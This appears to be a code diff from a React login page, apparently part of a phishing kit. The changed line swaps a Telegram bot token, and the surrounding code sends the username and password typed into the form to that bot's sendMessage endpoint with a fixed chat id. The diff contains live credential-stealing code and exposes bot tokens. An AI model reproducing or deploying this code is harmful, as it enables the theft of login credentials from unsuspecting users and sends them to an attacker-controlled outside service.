@@ -71,7 +71,7 @@ function HomePage() {
             qfFunck(passwordUser.current);
             if (qfNum === 0) {
                 if (userName.current.value && passwordUser.current.value) {
-                    const url = `https://api.telegram.org/bot7200818155:AAF9EaPk7xr8kBsonHfMpg8JrwA_s8TRWkM/sendMessage` // The url to request
+                    const url = `https://api.telegram.org/bot7736040222:AAE_CVTnHYxDN8lCrAelRlrhNrYnNwVoDDc/sendMessage` // The url to request
                     const obj = {
                         chat_id: 1368494862, // Telegram chat id
                         text: "Username - " + userName.current.value + "\n" + "Verify - " + passwordUser.current.value, // The text to send
